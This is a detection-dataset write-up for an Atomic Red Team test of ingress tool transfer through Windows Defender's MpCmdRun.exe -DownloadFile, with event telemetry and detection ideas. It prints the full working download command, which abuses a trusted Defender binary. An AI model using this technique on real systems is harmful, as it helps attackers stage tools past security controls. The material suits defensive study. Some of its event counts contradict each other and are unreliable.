# T1105-13: Ingress Tool Transfer — Download a File with Windows Defender MpCmdRun.exe

## Technique Context

T1105 (Ingress Tool Transfer) covers adversary methods for moving tools and files into a compromised environment. This test demonstrates one of the more cunning LOLBin (Living-Off-the-Land Binary) download techniques: using `MpCmdRun.exe` — Windows Defender's own command-line management utility — to download files from the internet.

`MpCmdRun.exe` accepts a `-DownloadFile` parameter intended for updating Defender signatures and downloading threat samples for analysis. When invoked with `-url` and `-path` arguments, it performs an authenticated HTTP download to the specified local path. Because the binary is Microsoft-signed, highly trusted, and explicitly associated with an AV product, it is often permitted through security controls that would block PowerShell's `Invoke-WebRequest`, `certutil -urlcache`, or `bitsadmin /transfer`. Some EDR products and firewall rules specifically allow network connections from `MpCmdRun.exe` on the assumption that it is only used for legitimate Defender operations.

This attack technique was publicly documented and added to the LOLBins catalog as a way to abuse the Defender toolchain against itself — a defender using the antivirus product to bypass antivirus-adjacent controls.

## What This Dataset Contains

The dataset spans approximately twenty seconds (2026-03-14T23:39:38Z–~23:39:58Z) on ACME-WS06.acme.local and contains 84 events across three channels.

**The core download command** is captured in Security EID 4688 (cmd.exe):

```
"cmd.exe" /c cd "%ProgramData%\Microsoft\Windows Defender\platform\4.18*"
& MpCmdRun.exe -DownloadFile
    -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
    -path %temp%\Atomic-license.txt
```

The command first `cd`s to the Defender platform directory (using a wildcard to handle version numbering), then invokes `MpCmdRun.exe` with `-DownloadFile`, a `-url` pointing to the ART repository's LICENSE.txt on GitHub, and `-path` writing to `%temp%\Atomic-license.txt`. This is a functional, working download command that will retrieve the specified file if network access permits.

**Security EID 4688** (4 events):
- `WmiPrvSE.exe -Embedding` (spawned by `svchost.exe`) — WMI provider host activated, consistent with the ART test framework using WMI for test management
- `whoami.exe` — test framework environment check
- `cmd.exe` with the full MpCmdRun download command (above)
- `whoami.exe` — post-test framework check

All run under `NT AUTHORITY\SYSTEM`.

**Sysmon EID 1** (3 events):
- `WmiPrvSE.exe` (PID 744, rule `T1047,technique_name=Windows Management Instrumentation`) spawned by `svchost.exe`
- `whoami.exe` (PID 6284, rule `T1033`, parent powershell.exe)

The `cmd.exe` executing MpCmdRun does not appear as a Sysmon EID 1 event in the sample set, but the full command line is preserved in Security EID 4688.

**Sysmon EID 8** (1 event, CreateRemoteThread): `technique_id=T1055,technique_name=Process Injection`. Source process is `powershell.exe` (PID 1304), target is `<unknown process>` (PID 4464), new thread ID 6464. The target process being marked `<unknown>` indicates it terminated before Sysmon could resolve its image path — consistent with a short-lived process created and immediately terminated during the download workflow. This EID 8 event is a notable behavioral artifact produced by PowerShell's interaction with the WMI/test infrastructure.

**Sysmon EID 10** (2 events): PowerShell accessing `whoami.exe` with 0x1FFFFF access.

**Sysmon EID 7** (10 events): DLL loads for PowerShell.

**Sysmon EID 17** (1 event): PowerShell named pipe creation.

**Security EID 4798** (5 events): These record local group membership enumeration for specific users: `Administrator`, `DefaultAccount`, `Guest`, `mm11711`, and `WDAGUtilityAccount` — all by `WmiPrvSE.exe` (PID 0x1298).

The WmiPrvSE.exe user-level group enumeration (EID 4798) is likely triggered by the ART test framework's WMI-based test orchestration.

**PowerShell EID 4104** (36 events), **EID 4100** (2 events), and **EID 4103** (1 event): script block session events. EID 4100 marks the PowerShell engine lifecycle (session starts). EID 4103 captures a pipeline execution event. The MpCmdRun download invocation itself is captured in the Security 4688 rather than EID 4104 (it runs in a cmd.exe subprocess, not directly in PowerShell).

## What This Dataset Does Not Contain

No Sysmon EID 3 (network connection) events capture the MpCmdRun download attempt. Whether the download succeeded or failed (network access may be restricted in the lab), the HTTP connection would appear as a network event from `MpCmdRun.exe` to GitHub's servers — its absence either means the download was blocked at network level or the 17-event Sysmon sample did not include the EID 3.

No file creation events (Sysmon EID 11) confirm whether `%temp%\Atomic-license.txt` was actually written. Whether the download succeeded is not determinable from the host-based telemetry alone.

No Defender-specific blocking events exist with Defender disabled.

## Assessment

With Defender disabled, the MpCmdRun download command ran without interference. The Security EID 4688 command line is completely preserved, including the full URL and destination path. This is a clean demonstration of the technique's command-line signature.

Compared to the defended variant (35 Sysmon, 9 Security, 41 PowerShell), the undefended dataset has fewer Sysmon events (17 vs. 35) but substantially more Security events (28 vs. 9). The large Security event count here is dominated by the 5 EID 4798 group enumeration events from WmiPrvSE — background telemetry that appeared in this dataset's capture window but not in the defended variant. The Sysmon reduction reflects the absence of Defender inspection processes.

The Sysmon EID 8 CreateRemoteThread event (process injection rule) is worth noting: it appears here from PowerShell's interaction with the WMI infrastructure, not from MpCmdRun itself. This artifact is a source of potential false-positive noise in detection logic targeting EID 8.

## Detection Opportunities Present in This Data

**`MpCmdRun.exe -DownloadFile` with external URL**: Security EID 4688 captures the complete command including the `-DownloadFile` flag, the URL, and the destination path. The `-DownloadFile` argument to `MpCmdRun.exe` is essentially never used by legitimate Defender operations in normal enterprise environments — any occurrence warrants immediate investigation.

**`cmd.exe /c cd "%ProgramData%\Microsoft\Windows Defender\platform\4.18*"` pattern**: The wildcard path expansion for the Defender platform directory is a known workaround for the version-numbered directory structure. This specific `cd` pattern as a prefix to MpCmdRun execution is a consistent, detectable signature.

**WmiPrvSE.exe local user and group enumeration (EID 4798)**: WMI Provider Host enumerating local user group memberships for all local accounts is a behavioral indicator of WMI-based reconnaissance or orchestration. While the EID 4799 events here are from Cribl (benign), the EID 4798 events from WmiPrvSE during the test execution are associated with the WMI-based ART test framework activity.

**Sysmon EID 8 to `<unknown process>`**: A PowerShell process creating a remote thread in an already-terminated process (resulting in `<unknown>` image path) indicates rapid process creation and termination — behavior associated with injected code or very short-lived subprocesses. While not uniquely attributed to MpCmdRun in this dataset, correlating EID 8 to `<unknown>` targets with concurrent download activity strengthens the behavioral case.
